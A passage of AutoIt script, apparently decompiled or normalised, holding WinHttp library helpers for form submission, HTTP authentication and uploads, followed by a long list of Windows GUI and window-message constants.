	EndIf
EndFunc

Func __winhttptrimbounds(ByRef $sdta, $sbound)
	Local $iblen = StringLen($sbound)
	If StringRight($sdta, $iblen) = $sbound Then $sdta = StringTrimRight($sdta, $iblen)
	If StringLeft($sdta, $iblen) = $sbound Then $sdta = StringTrimLeft($sdta, $iblen)
EndFunc

Func __winhttpformattrib(ByRef $aattrib, $i, $selement)
	$aattrib[0][$i] = __winhttpattribval($selement, "id")
	$aattrib[1][$i] = __winhttpattribval($selement, "name")
	$aattrib[2][$i] = __winhttpattribval($selement, "value")
	$aattrib[3][$i] = __winhttpattribval($selement, "type")
EndFunc

Func __winhttpattribval($sin, $sattrib)
	Local $aarray = StringRegExp($sin, "(?i).*?(\A| )\b" & $sattrib & '\h*=(\h*"(.*?)"|' & "\h*'(.*?)'|" & "\h*(.*?)(?: |\Z))", 1)
	If @error Then Return ""
	Return $aarray[UBound($aarray) - 1]
EndFunc

Func __winhttpformsend($hinternet, $smethod, $saction, $fmultipart, $sboundary, $sadddata, $fsecure = False, $sadditionalheaders = "", $scredname = "", $scredpass = "", $iignoreallcerterrors = 0)
	Local $hrequest
	If $fsecure Then
		$hrequest = _winhttpopenrequest($hinternet, $smethod, $saction, Default, Default, Default, $winhttp_flag_secure)
		If $iignoreallcerterrors Then _winhttpsetoption($hrequest, $winhttp_option_security_flags, BitOR($security_flag_ignore_unknown_ca, $security_flag_ignore_cert_date_invalid, $security_flag_ignore_cert_cn_invalid, $security_flag_ignore_cert_wrong_usage))
	Else
		$hrequest = _winhttpopenrequest($hinternet, $smethod, $saction)
	EndIf
	If $fmultipart Then
		_winhttpaddrequestheaders($hrequest, "Content-Type: multipart/form-data; boundary=" & $sboundary)
	Else
		If $smethod = "POST" Then _winhttpaddrequestheaders($hrequest, "Content-Type: application/x-www-form-urlencoded")
	EndIf
	_winhttpaddrequestheaders($hrequest, "Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,*/*;q=0.5")
	_winhttpaddrequestheaders($hrequest, "Accept-Charset: utf-8;q=0.7")
	If $sadditionalheaders Then _winhttpaddrequestheaders($hrequest, $sadditionalheaders, BitOR($winhttp_addreq_flag_replace, $winhttp_addreq_flag_add))
	_winhttpsetoption($hrequest, $winhttp_option_decompression, $winhttp_decompression_flag_all)
	_winhttpsetoption($hrequest, $winhttp_option_unsafe_header_parsing, 1)
	__winhttpformupload($hrequest, "", $sadddata)
	_winhttpreceiveresponse($hrequest)
	__winhttpsetcredentials($hrequest, "", $sadddata, $scredname, $scredpass, 1)
	Return $hrequest
EndFunc

Func __winhttpsetcredentials($hrequest, $sheaders = "", $soptional = "", $scredname = "", $scredpass = "", $iformfill = 0)
	If $scredname AND $scredpass Then
		Local $istatuscode = _winhttpqueryheaders($hrequest, $winhttp_query_status_code)
		If $istatuscode = $http_status_denied OR $istatuscode = $http_status_proxy_auth_req Then
			Local $isupportedschemes, $ifirstscheme, $iauthtarget
			If _winhttpqueryauthschemes($hrequest, $isupportedschemes, $ifirstscheme, $iauthtarget) Then
				If $ifirstscheme = $winhttp_auth_scheme_passport AND $istatuscode = $http_status_proxy_auth_req Then
					_winhttpsetoption($hrequest, $winhttp_option_configure_passport_auth, $winhttp_enable_passport_auth)
					_winhttpsetoption($hrequest, $winhttp_option_proxy_username, $scredname)
					_winhttpsetoption($hrequest, $winhttp_option_proxy_password, $scredpass)
				Else
					_winhttpsetcredentials($hrequest, $iauthtarget, $ifirstscheme, $scredname, $scredpass)
				EndIf
				If $iformfill Then
					__winhttpformupload($hrequest, $sheaders, $soptional)
				Else
					_winhttpsendrequest($hrequest, $sheaders, $soptional)
				EndIf
				_winhttpreceiveresponse($hrequest)
			EndIf
		EndIf
	EndIf
EndFunc

Func __winhttpformupload($hrequest, $sheaders, $sdata)
	Local $aclbk = _winhttpsimpleformfill_setuploadcallback()
	If $aclbk[0] <> Default Then
		Local $isize = StringLen($sdata), $ichunk = Floor($isize / $aclbk[1]), $irest = $isize - ($aclbk[1] - 1) * $ichunk, $icurch = $ichunk
		_winhttpsendrequest($hrequest, Default, Default, $isize)
		For $i = 1 To $aclbk[1]
			If $i = $aclbk[1] Then $icurch = $irest
			_winhttpwritedata($hrequest, StringMid($sdata, 1 + $ichunk * ($i - 1), $icurch))
			Call($aclbk[0], Floor($i * 100 / $aclbk[1]))
		Next
	Else
		_winhttpsendrequest($hrequest, Default, $sdata)
	EndIf
EndFunc

Func __winhttpdefault(ByRef $vinput, $voutput)
	If $vinput = Default OR Number($vinput) = -1 Then $vinput = $voutput
EndFunc

Func __winhttpmemglobalfree($pmem)
	Local $acall = DllCall("kernel32.dll", "ptr", "GlobalFree", "ptr", $pmem)
	If @error OR $acall[0] Then Return SetError(1, 0, 0)
	Return 1
EndFunc

Func __winhttpptrstringlenw($pstr)
	Local $acall = DllCall("kernel32.dll", "dword", "lstrlenW", "ptr", $pstr)
	If @error Then Return SetError(1, 0, 0)
	Return $acall[0]
EndFunc

Func __winhttpua()
	Local Static $sua = "Mozilla/5.0 " & __winhttpsysinfo() & " WinHttp/" & __winhttpver() & " (WinHTTP/5.1) like Gecko"
	Return $sua
EndFunc

Func __winhttpsysinfo()
	Local $sdta = FileGetVersion("kernel32.dll")
	$sdta = "(Windows NT " & StringLeft($sdta, StringInStr($sdta, ".", 1, 2) - 1)
	If StringInStr(@OSArch, "64") AND NOT @AutoItX64 Then $sdta &= "; WOW64"
	$sdta &= ")"
	Return $sdta
EndFunc

Func __winhttpver()
	Return "1.6.4.1"
EndFunc

Func _winhttpbinaryconcat(ByRef $bbinary1, ByRef $bbinary2)
	Local $bout = _winhttpsimplebinaryconcat($bbinary1, $bbinary2)
	Return SetError(@error, 0, $bout)
EndFunc

Global Const $gui_event_single = 0
Global Const $gui_event_array = 1
Global Const $gui_event_none = 0
Global Const $gui_event_close = -3
Global Const $gui_event_minimize = -4
Global Const $gui_event_restore = -5
Global Const $gui_event_maximize = -6
Global Const $gui_event_primarydown = -7
Global Const $gui_event_primaryup = -8
Global Const $gui_event_secondarydown = -9
Global Const $gui_event_secondaryup = -10
Global Const $gui_event_mousemove = -11
Global Const $gui_event_resized = -12
Global Const $gui_event_dropped = -13
Global Const $gui_rundefmsg = "GUI_RUNDEFMSG"
Global Const $gui_avistop = 0
Global Const $gui_avistart = 1
Global Const $gui_aviclose = 2
Global Const $gui_checked = 1
Global Const $gui_indeterminate = 2
Global Const $gui_unchecked = 4
Global Const $gui_dropaccepted = 8
Global Const $gui_nodropaccepted = 4096
Global Const $gui_acceptfiles = $gui_dropaccepted
Global Const $gui_show = 16
Global Const $gui_hide = 32
Global Const $gui_enable = 64
Global Const $gui_disable = 128
Global Const $gui_focus = 256
Global Const $gui_nofocus = 8192
Global Const $gui_defbutton = 512
Global Const $gui_expand = 1024
Global Const $gui_ontop = 2048
Global Const $gui_fontnormal = 0
Global Const $gui_fontitalic = 2
Global Const $gui_fontunder = 4
Global Const $gui_fontstrike = 8
Global Const $gui_dockauto = 1
Global Const $gui_dockleft = 2
Global Const $gui_dockright = 4
Global Const $gui_dockhcenter = 8
Global Const $gui_docktop = 32
Global Const $gui_dockbottom = 64
Global Const $gui_dockvcenter = 128
Global Const $gui_dockwidth = 256
Global Const $gui_dockheight = 512
Global Const $gui_docksize = 768
Global Const $gui_dockmenubar = 544
Global Const $gui_dockstatebar = 576
Global Const $gui_dockall = 802
Global Const $gui_dockborders = 102
Global Const $gui_gr_close = 1
Global Const $gui_gr_line = 2
Global Const $gui_gr_bezier = 4
Global Const $gui_gr_move = 6
Global Const $gui_gr_color = 8
Global Const $gui_gr_rect = 10
Global Const $gui_gr_ellipse = 12
Global Const $gui_gr_pie = 14
Global Const $gui_gr_dot = 16
Global Const $gui_gr_pixel = 18
Global Const $gui_gr_hint = 20
Global Const $gui_gr_refresh = 22
Global Const $gui_gr_pensize = 24
Global Const $gui_gr_nobkcolor = -2
Global Const $gui_bkcolor_default = -1
Global Const $gui_bkcolor_transparent = -2
Global Const $gui_bkcolor_lv_alternate = -33554432
Global Const $gui_read_default = 0
Global Const $gui_read_extended = 1
Global Const $gui_cursor_nooverride = 0
Global Const $gui_cursor_override = 1
Global Const $gui_ws_ex_parentdrag = 1048576
Global Const $ss_left = 0
Global Const $ss_center = 1
Global Const $ss_right = 2
Global Const $ss_icon = 3
Global Const $ss_blackrect = 4
Global Const $ss_grayrect = 5
Global Const $ss_whiterect = 6
Global Const $ss_blackframe = 7
Global Const $ss_grayframe = 8
Global Const $ss_whiteframe = 9
Global Const $ss_simple = 11
Global Const $ss_leftnowordwrap = 12
Global Const $ss_bitmap = 14
Global Const $ss_enhmetafile = 15
Global Const $ss_etchedhorz = 16
Global Const $ss_etchedvert = 17
Global Const $ss_etchedframe = 18
Global Const $ss_realsizecontrol = 64
Global Const $ss_noprefix = 128
Global Const $ss_notify = 256
Global Const $ss_centerimage = 512
Global Const $ss_rightjust = 1024
Global Const $ss_sunken = 4096
Global Const $gui_ss_default_label = 0
Global Const $gui_ss_default_graphic = 0
Global Const $gui_ss_default_icon = $ss_notify
Global Const $gui_ss_default_pic = $ss_notify
Global Const $stm_seticon = 368
Global Const $stm_geticon = 369
Global Const $stm_setimage = 370
Global Const $stm_getimage = 371
Global Const $wc_animate = "SysAnimate32"
Global Const $wc_button = "Button"
Global Const $wc_combobox = "ComboBox"
Global Const $wc_comboboxex = "ComboBoxEx32"
Global Const $wc_datetimepick = "SysDateTimePick32"
Global Const $wc_edit = "Edit"
Global Const $wc_header = "SysHeader32"
Global Const $wc_hotkey = "msctls_hotkey32"
Global Const $wc_ipaddress = "SysIPAddress32"
Global Const $wc_link = "SysLink"
Global Const $wc_listbox = "ListBox"
Global Const $wc_listview = "SysListView32"
Global Const $wc_monthcal = "SysMonthCal32"
Global Const $wc_nativefontctl = "NativeFontCtl"
Global Const $wc_pagescroller = "SysPager"
Global Const $wc_progress = "msctls_progress32"
Global Const $wc_rebar = "ReBarWindow32"
Global Const $wc_scrollbar = "ScrollBar"
Global Const $wc_static = "Static"
Global Const $wc_statusbar = "msctls_statusbar32"
Global Const $wc_tabcontrol = "SysTabControl32"
Global Const $wc_toolbar = "ToolbarWindow32"
Global Const $wc_tooltips = "tooltips_class32"
Global Const $wc_trackbar = "msctls_trackbar32"
Global Const $wc_treeview = "SysTreeView32"
Global Const $wc_updown = "msctls_updown32"
Global Const $ws_overlapped = 0
Global Const $ws_tiled = $ws_overlapped
Global Const $ws_maximizebox = 65536
Global Const $ws_minimizebox = 131072
Global Const $ws_tabstop = 65536
Global Const $ws_group = 131072
Global Const $ws_sizebox = 262144
Global Const $ws_thickframe = $ws_sizebox
Global Const $ws_sysmenu = 524288
Global Const $ws_hscroll = 1048576
Global Const $ws_vscroll = 2097152
Global Const $ws_dlgframe = 4194304
Global Const $ws_border = 8388608
Global Const $ws_caption = 12582912
Global Const $ws_overlappedwindow = BitOR($ws_caption, $ws_maximizebox, $ws_minimizebox, $ws_overlapped, $ws_sysmenu, $ws_thickframe)
Global Const $ws_tiledwindow = $ws_overlappedwindow
Global Const $ws_maximize = 16777216
Global Const $ws_clipchildren = 33554432
Global Const $ws_clipsiblings = 67108864
Global Const $ws_disabled = 134217728
Global Const $ws_visible = 268435456
Global Const $ws_minimize = 536870912
Global Const $ws_iconic = $ws_minimize
Global Const $ws_child = 1073741824
Global Const $ws_childwindow = $ws_child
Global Const $ws_popup = -2147483648
Global Const $ws_popupwindow = -2138570752
Global Const $ds_3dlook = 4
Global Const $ds_absalign = 1
Global Const $ds_center = 2048
Global Const $ds_centermouse = 4096
Global Const $ds_contexthelp = 8192
Global Const $ds_control = 1024
Global Const $ds_fixedsys = 8
Global Const $ds_localedit = 32
Global Const $ds_modalframe = 128
Global Const $ds_nofailcreate = 16
Global Const $ds_noidlemsg = 256
Global Const $ds_setfont = 64
Global Const $ds_setforeground = 512
Global Const $ds_shellfont = BitOR($ds_fixedsys, $ds_setfont)
Global Const $ds_sysmodal = 2
Global Const $ws_ex_acceptfiles = 16
Global Const $ws_ex_appwindow = 262144
Global Const $ws_ex_composited = 33554432
Global Const $ws_ex_controlparent = 65536
Global Const $ws_ex_clientedge = 512
Global Const $ws_ex_contexthelp = 1024
Global Const $ws_ex_dlgmodalframe = 1
Global Const $ws_ex_layered = 524288
Global Const $ws_ex_layoutrtl = 4194304
Global Const $ws_ex_left = 0
Global Const $ws_ex_leftscrollbar = 16384
Global Const $ws_ex_ltrreading = 0
Global Const $ws_ex_mdichild = 64
Global Const $ws_ex_noactivate = 134217728
Global Const $ws_ex_noinheritlayout = 1048576
Global Const $ws_ex_noparentnotify = 4
Global Const $ws_ex_right = 4096
Global Const $ws_ex_rightscrollbar = 0
Global Const $ws_ex_rtlreading = 8192
Global Const $ws_ex_staticedge = 131072
Global Const $ws_ex_toolwindow = 128
Global Const $ws_ex_topmost = 8
Global Const $ws_ex_transparent = 32
Global Const $ws_ex_windowedge = 256
Global Const $ws_ex_overlappedwindow = BitOR($ws_ex_clientedge, $ws_ex_windowedge)
Global Const $ws_ex_palettewindow = BitOR($ws_ex_toolwindow, $ws_ex_topmost, $ws_ex_windowedge)
Global Const $wm_null = 0
Global Const $wm_create = 1
Global Const $wm_destroy = 2
Global Const $wm_move = 3
Global Const $wm_sizewait = 4
Global Const $wm_size = 5
Global Const $wm_activate = 6
Global Const $wm_setfocus = 7
Global Const $wm_killfocus = 8
Global Const $wm_setvisible = 9
Global Const $wm_enable = 10
Global Const $wm_setredraw = 11
Global Const $wm_settext = 12
Global Const $wm_gettext = 13
Global Const $wm_gettextlength = 14
Global Const $wm_paint = 15
Global Const $wm_close = 16
Global Const $wm_queryendsession = 17
Global Const $wm_quit = 18
Global Const $wm_erasebkgnd = 20
Global Const $wm_queryopen = 19
Global Const $wm_syscolorchange = 21
Global Const $wm_endsession = 22
Global Const $wm_systemerror = 23
Global Const $wm_showwindow = 24
Global Const $wm_ctlcolor = 25
Global Const $wm_settingchange = 26
Global Const $wm_wininichange = 26
Global Const $wm_devmodechange = 27
Global Const $wm_activateapp = 28
Global Const $wm_fontchange = 29
Global Const $wm_timechange = 30
Global Const $wm_cancelmode = 31
Global Const $wm_setcursor = 32
Global Const $wm_mouseactivate = 33
Global Const $wm_childactivate = 34
Global Const $wm_queuesync = 35
Global Const $wm_getminmaxinfo = 36
Global Const $wm_logoff = 37
Global Const $wm_painticon = 38
Global Const $wm_iconerasebkgnd = 39
Global Const $wm_nextdlgctl = 40
Global Const $wm_alttabactive = 41
Global Const $wm_spoolerstatus = 42
Global Const $wm_drawitem = 43
Global Const $wm_measureitem = 44
Global Const $wm_deleteitem = 45
Global Const $wm_vkeytoitem = 46
Global Const $wm_chartoitem = 47
Global Const $wm_setfont = 48
Global Const $wm_getfont = 49
Global Const $wm_sethotkey = 50
Global Const $wm_gethotkey = 51
Global Const $wm_filesyschange = 52
Global Const $wm_isactiveicon = 53
Global Const $wm_queryparkicon = 54
Global Const $wm_querydragicon = 55
Global Const $wm_winhelp = 56
Global Const $wm_compareitem = 57
Global Const $wm_fullscreen = 58
Global Const $wm_clientshutdown = 59
Global Const $wm_ddemlevent = 60
Global Const $wm_getobject = 61
Global Const $wm_calcscroll = 63
Global Const $wm_testing = 64
Global Const $wm_compacting = 65
Global Const $wm_otherwindowcreated = 66
Global Const $wm_otherwindowdestroyed = 67
Global Const $wm_commnotify = 68
Global Const $wm_mediastatuschange = 69
Global Const $wm_windowposchanging = 70
Global Const $wm_windowposchanged = 71
Global Const $wm_power = 72
Global Const $wm_copyglobaldata = 73
Global Const $wm_copydata = 74
Global Const $wm_canceljournal = 75
Global Const $wm_logonnotify = 76
Global Const $wm_keyf1 = 77
Global Const $wm_notify = 78
Global Const $wm_access_window = 79
Global Const $wm_inputlangchangerequest = 80
Global Const $wm_inputlangchange = 81
Global Const $wm_tcard = 82
Global Const $wm_help = 83
Global Const $wm_userchanged = 84
Global Const $wm_notifyformat = 85
Global Const $wm_qm_activate = 96
Global Const $wm_hook_do_callback = 97
Global Const $wm_syscopydata = 98
Global Const $wm_finaldestroy = 112
Global Const $wm_measureitem_clientdata = 113
Global Const $wm_contextmenu = 123
Global Const $wm_stylechanging = 124
Global Const $wm_stylechanged = 125
Global Const $wm_displaychange = 126
Global Const $wm_geticon = 127
Global Const $wm_seticon = 128
Global Const $wm_nccreate = 129
Global Const $wm_ncdestroy = 130
Global Const $wm_nccalcsize = 131
Global Const $wm_nchittest = 132
Global Const $wm_ncpaint = 133
Global Const $wm_ncactivate = 134
Global Const $wm_getdlgcode = 135
Global Const $wm_syncpaint = 136
Global Const $wm_synctask = 137
Global Const $wm_kludgeminrect = 139
Global Const $wm_lpkdrawswitchwnd = 140
Global Const $wm_uahdestroywindow = 144
Global Const $wm_uahdrawmenu = 145
Global Const $wm_uahdrawmenuitem = 146
Global Const $wm_uahinitmenu = 147
Global Const $wm_uahmeasuremenuitem = 148
Global Const $wm_uahncpaintmenupopup = 149
Global Const $wm_ncmousemove = 160
Global Const $wm_nclbuttondown = 161
Global Const $wm_nclbuttonup = 162
Global Const $wm_nclbuttondblclk = 163
Global Const $wm_ncrbuttondown = 164
Global Const $wm_ncrbuttonup = 165
Global Const $wm_ncrbuttondblclk = 166
Global Const $wm_ncmbuttondown = 167
Global Const $wm_ncmbuttonup = 168
Global Const $wm_ncmbuttondblclk = 169
Global Const $wm_ncxbuttondown = 171
Global Const $wm_ncxbuttonup = 172
Global Const $wm_ncxbuttondblclk = 173
Global Const $wm_ncuahdrawcaption = 174
Global Const $wm_ncuahdrawframe = 175
Global Const $wm_input_device_change = 254
Global Const $wm_input = 255
Global Const $wm_keydown = 256
Global Const $wm_keyfirst = 256
Global Const $wm_keyup = 257
Global Const $wm_char = 258
Global Const $wm_deadchar = 259
Global Const $wm_syskeydown = 260
Global Const $wm_syskeyup = 261
Global Const $wm_syschar = 262
Global Const $wm_sysdeadchar = 263
Global Const $wm_yomichar = 264
Global Const $wm_keylast = 265
Global Const $wm_unichar = 265
Global Const $wm_convertrequest = 266
Global Const $wm_convertresult = 267
Global Const $wm_im_info = 268
Global Const $wm_ime_startcomposition = 269
Global Const $wm_ime_endcomposition = 270
Global Const $wm_ime_composition = 271
Global Const $wm_ime_keylast = 271
Global Const $wm_initdialog = 272
Global Const $wm_command = 273
Global Const $wm_syscommand = 274
Global Const $wm_timer = 275
Global Const $wm_hscroll = 276
Global Const $wm_vscroll = 277
Global Const $wm_initmenu = 278
Global Const $wm_initmenupopup = 279
Global Const $wm_systimer = 280
Global Const $wm_gesture = 281
Global Const $wm_gesturenotify = 282
Global Const $wm_gestureinput = 283
Global Const $wm_gesturenotified = 284
Global Const $wm_menuselect = 287
Global Const $wm_menuchar = 288
Global Const $wm_enteridle = 289
Global Const $wm_menurbuttonup = 290
Global Const $wm_menudrag = 291
Global Const $wm_menugetobject = 292
Global Const $wm_uninitmenupopup = 293
Global Const $wm_menucommand = 294
Global Const $wm_changeuistate = 295
Global Const $wm_updateuistate = 296
Global Const $wm_queryuistate = 297
Global Const $wm_lbtrackpoint = 305
Global Const $wm_ctlcolormsgbox = 306
Global Const $wm_ctlcoloredit = 307
Global Const $wm_ctlcolorlistbox = 308
Global Const $wm_ctlcolorbtn = 309
Global Const $wm_ctlcolordlg = 310
Global Const $wm_ctlcolorscrollbar = 311
Global Const $wm_ctlcolorstatic = 312
Global Const $mn_gethmenu = 481
Global Const $wm_parentnotify = 528
Global Const $wm_entermenuloop = 529
Global Const $wm_exitmenuloop = 530
Global Const $wm_nextmenu = 531
Global Const $wm_sizing = 532
Global Const $wm_capturechanged = 533
Global Const $wm_moving = 534
Global Const $wm_powerbroadcast = 536
Global Const $wm_devicechange = 537
Global Const $wm_mdicreate = 544
Global Const $wm_mdidestroy = 545
Global Const $wm_mdiactivate = 546
Global Const $wm_mdirestore = 547
Global Const $wm_mdinext = 548
Global Const $wm_mdimaximize = 549
Global Const $wm_mditile = 550
Global Const $wm_mdicascade = 551
Global Const $wm_mdiiconarrange = 552
Global Const $wm_mdigetactive = 553
Global Const $wm_dropobject = 554
Global Const $wm_querydropobject = 555
Global Const $wm_begindrag = 556
Global Const $wm_dragloop = 557
Global Const $wm_dragselect = 558
Global Const $wm_dragmove = 559
Global Const $wm_mdisetmenu = 560
Global Const $wm_entersizemove = 561
Global Const $wm_exitsizemove = 562
Global Const $wm_dropfiles = 563
Global Const $wm_mdirefreshmenu = 564
Global Const $wm_touch = 576
Global Const $wm_ime_setcontext = 641
Global Const $wm_ime_notify = 642
Global Const $wm_ime_control = 643
Global Const $wm_ime_compositionfull = 644
Global Const $wm_ime_select = 645
Global Const $wm_ime_char = 646
Global Const $wm_ime_system = 647
Global Const $wm_ime_request = 648
Global Const $wm_ime_keydown = 656
Global Const $wm_ime_keyup = 657
Global Const $wm_ncmousehover = 672
Global Const $wm_mousehover = 673
Global Const $wm_ncmouseleave = 674
Global Const $wm_mouseleave = 675
Global Const $wm_wtssession_change = 689
Global Const $wm_tablet_first = 704
Global Const $wm_tablet_last = 735
Global Const $wm_cut = 768
Global Const $wm_copy = 769
Global Const $wm_paste = 770
Global Const $wm_clear = 771
Global Const $wm_undo = 772
Global Const $wm_paletteischanging = 784
Global Const $wm_hotkey = 786
Global Const $wm_palettechanged = 785
Global Const $wm_sysmenu = 787
Global Const $wm_hookmsg = 788
Global Const $wm_exitprocess = 789
Global Const $wm_wakethread = 790
Global Const $wm_print = 791
Global Const $wm_printclient = 792
Global Const $wm_appcommand = 793
Global Const $wm_querynewpalette = 783
Global Const $wm_themechanged = 794
Global Const $wm_uahinit = 795
Global Const $wm_desktopnotify = 796
Global Const $wm_clipboardupdate = 797
Global Const $wm_dwmcompositionchanged = 798
Global Const $wm_dwmncrenderingchanged = 799
Global Const $wm_dwmcolorizationcolorchanged = 800
Global Const $wm_dwmwindowmaximizedchange = 801
Global Const $wm_dwmexileframe = 802
Global Const $wm_dwmsendiconicthumbnail = 803
Global Const $wm_magnification_started = 804
Global Const $wm_magnification_ended = 805
Global Const $wm_dwmsendiconiclivepreviewbitmap = 806
Global Const $wm_dwmthumbnailsizechanged = 807
Global Const $wm_magnification_output = 808
Global Const $wm_measurecontrol = 816
Global Const $wm_getactiontext = 817
Global Const $wm_forwardkeydown = 819
Global Const $wm_forwardkeyup = 820
Global Const $wm_gettitlebarinfoex = 831
Global Const $wm_notifywow = 832
Global Const $wm_handheldfirst = 856
Global Const $wm_handheldlast = 863
Global Const $wm_afxfirst = 864
Global Const $wm_afxlast = 895
Global Const $wm_penwinfirst = 896
Global Const $wm_penwinlast = 911
Global Const $wm_dde_initiate = 992
Global Const $wm_dde_terminate = 993
Global Const $wm_dde_advise = 994
Global Const $wm_dde_unadvise = 995
Global Const $wm_dde_ack = 996
Global Const $wm_dde_data = 997
Global Const $wm_dde_request = 998
Global Const $wm_dde_poke = 999
Global Const $wm_dde_execute = 1000
Global Const $wm_dbnotification = 1021
Global Const $wm_netconnect = 1022
Global Const $wm_hibernate = 1023
Global Const $wm_user = 1024
Global Const $wm_app = 32768
Global Const $nm_first = 0
Global Const $nm_outofmemory = $nm_first - 1
Global Const $nm_click = $nm_first - 2
Global Const $nm_dblclk = $nm_first - 3
Global Const $nm_return = $nm_first - 4
Global Const $nm_rclick = $nm_first - 5
Global Const $nm_rdblclk = $nm_first - 6
Global Const $nm_setfocus = $nm_first - 7
Global Const $nm_killfocus = $nm_first - 8
Global Const $nm_customdraw = $nm_first - 12
Global Const $nm_hover = $nm_first - 13
Global Const $nm_nchittest = $nm_first - 14
Global Const $nm_keydown = $nm_first - 15
Global Const $nm_releasedcapture = $nm_first - 16
Global Const $nm_setcursor = $nm_first - 17
Global Const $nm_char = $nm_first - 18
Global Const $nm_tooltipscreated = $nm_first - 19
Global Const $nm_ldown = $nm_first - 20
Global Const $nm_rdown = $nm_first - 21
Global Const $nm_themechanged = $nm_first - 22
Global Const $wm_mousefirst = 512
Global Const $wm_mousemove = 512
Global Const $wm_lbuttondown = 513
Global Const $wm_lbuttonup = 514
Global Const $wm_lbuttondblclk = 515
Global Const $wm_rbuttondown = 516
Global Const $wm_rbuttonup = 517
Global Const $wm_rbuttondblclk = 518
Global Const $wm_mbuttondown = 519
Global Const $wm_mbuttonup = 520
Global Const $wm_mbuttondblclk = 521
Global Const $wm_mousewheel = 522
Global Const $wm_xbuttondown = 523
Global Const $wm_xbuttonup = 524
Global Const $wm_xbuttondblclk = 525
Global Const $wm_mousehwheel = 526
Global Const $ps_solid = 0
Global Const $ps_dash = 1
Global Const $ps_dot = 2
Global Const $ps_dashdot = 3
Global Const $ps_dashdotdot = 4
Global Const $ps_null = 5
Global Const $ps_insideframe = 6
Global Const $ps_userstyle = 7
Global Const $ps_alternate = 8
Global Const $ps_endcap_round = 0
Global Const $ps_endcap_square = 256
Global Const $ps_endcap_flat = 512
Global Const $ps_join_bevel = 4096
Global Const $ps_join_miter = 8192
Global Const $ps_join_round = 0
Global Const $ps_geometric = 65536
Global Const $ps_cosmetic = 0
Global Const $lwa_alpha = 2
Global Const $lwa_colorkey = 1
Global Const $rgn_and = 1
Global Const $rgn_or = 2
Global Const $rgn_xor = 3
Global Const $rgn_diff = 4
Global Const $rgn_copy = 5
Global Const $errorregion = 0
Global Const $nullregion = 1
Global Const $simpleregion = 2
Global Const $complexregion = 3
Global Const $transparent = 1
Global Const $opaque = 2
Global Const $ccm_first = 8192
Global Const $ccm_getunicodeformat = ($ccm_first + 6)
Global Const $ccm_setunicodeformat = ($ccm_first + 5)
Global Const $ccm_setbkcolor = $ccm_first + 1
Global Const $ccm_setcolorscheme = $ccm_first + 2
Global Const $ccm_getcolorscheme = $ccm_first + 3
Global Const $ccm_getdroptarget = $ccm_first + 4
Global Const $ccm_setwindowtheme = $ccm_first + 11
Global Const $ga_parent = 1
Global Const $ga_root = 2
Global Const $ga_rootowner = 3
Global Const $sm_cxscreen = 0
Global Const $sm_cyscreen = 1
Global Const $sm_cxvscroll = 2
Global Const $sm_cyhscroll = 3
Global Const $sm_cycaption = 4
Global Const $sm_cxborder = 5
Global Const $sm_cyborder = 6
Global Const $sm_cxfixedframe = 7
Global Const $sm_cxdlgframe = $sm_cxfixedframe
Global Const $sm_cyfixedframe = 8
Global Const $sm_cydlgframe = $sm_cyfixedframe
Global Const $sm_cyvthumb = 9
Global Const $sm_cxhthumb = 10
Global Const $sm_cxicon = 11
Global Const $sm_cyicon = 12
Global Const $sm_cxcursor = 13
Global Const $sm_cycursor = 14
Global Const $sm_cymenu = 15
Global Const $sm_cxfullscreen = 16
Global Const $sm_cyfullscreen = 17
Global Const $sm_cykanjiwindow = 18
Global Const $sm_mousepresent = 19
Global Const $sm_cyvscroll = 20
Global Const $sm_cxhscroll = 21
Global Const $sm_debug = 22
Global Const $sm_swapbutton = 23
Global Const $sm_reserved1 = 24
Global Const $sm_reserved2 = 25
Global Const $sm_reserved3 = 26
Global Const $sm_reserved4 = 27
Global Const $sm_cxmin = 28
Global Const $sm_cymin = 29
Global Const $sm_cxsize = 30
Global Const $sm_cysize = 31
Global Const $sm_cxsizeframe = 32
Global Const $sm_cxframe = $sm_cxsizeframe
Global Const $sm_cysizeframe = 33
Global Const $sm_cyframe = $sm_cysizeframe
Global Const $sm_cxmintrack = 34
Global Const $sm_cymintrack = 35
Global Const $sm_cxdoubleclk = 36
Global Const $sm_cydoubleclk = 37
Global Const $sm_cxiconspacing = 38
Global Const $sm_cyiconspacing = 39
Global Const $sm_menudropalignment = 40
Global Const $sm_penwindows = 41
Global Const $sm_dbcsenabled = 42
Global Const $sm_cmousebuttons = 43
Global Const $sm_secure = 44
Global Const $sm_cxedge = 45
Global Const $sm_cyedge = 46
Global Const $sm_cxminspacing = 47
Global Const $sm_cyminspacing = 48
Global Const $sm_cxsmicon = 49
Global Const $sm_cysmicon = 50
Global Const $sm_cysmcaption = 51
Global Const $sm_cxsmsize = 52
Global Const $sm_cysmsize = 53
Global Const $sm_cxmenusize = 54
Global Const $sm_cymenusize = 55
Global Const $sm_arrange = 56
Global Const $sm_cxminimized = 57
Global Const $sm_cyminimized = 58
Global Const $sm_cxmaxtrack = 59
Global Const $sm_cymaxtrack = 60
Global Const $sm_cxmaximized = 61
Global Const $sm_cymaximized = 62
Global Const $sm_network = 63
Global Const $sm_cleanboot = 67
Global Const $sm_cxdrag = 68
Global Const $sm_cydrag = 69
Global Const $sm_showsounds = 70
Global Const $sm_cxmenucheck = 71
Global Const $sm_cymenucheck = 72
Global Const $sm_slowmachine = 73
Global Const $sm_mideastenabled = 74
Global Const $sm_mousewheelpresent = 75
Global Const $sm_xvirtualscreen = 76
Global Const $sm_yvirtualscreen = 77
Global Const $sm_cxvirtualscreen = 78
Global Const $sm_cyvirtualscreen = 79
Global Const $sm_cmonitors = 80
Global Const $sm_samedisplayformat = 81
Global Const $sm_immenabled = 82
Global Const $sm_cxfocusborder = 83
Global Const $sm_cyfocusborder = 84
Global Const $sm_tabletpc = 86
Global Const $sm_mediacenter = 87
Global Const $sm_starter = 88
Global Const $sm_serverr2 = 89
Global Const $sm_cmetrics = 90
Global Const $sm_remotesession = 4096
Global Const $sm_shuttingdown = 8192
Global Const $sm_remotecontrol = 8193
Global Const $sm_caretblinkingenabled = 8194
Global Const $blackness = 66
Global Const $captureblt = 1073741824
Global Const $dstinvert = 5570569
Global Const $mergecopy = 12583114
Global Const $mergepaint = 12255782
Global Const $nomirrorbitmap = -2147483648
Global Const $notsrccopy = 3342344
Global Const $notsrcerase = 1114278
Global Const $patcopy = 15728673
Global Const $patinvert = 5898313
Global Const $patpaint = 16452105
Global Const $srcand = 8913094
Global Const $srccopy = 13369376
Global Const $srcerase = 4457256
Global Const $srcinvert = 6684742
Global Const $srcpaint = 15597702
Global Const $whiteness = 16711778
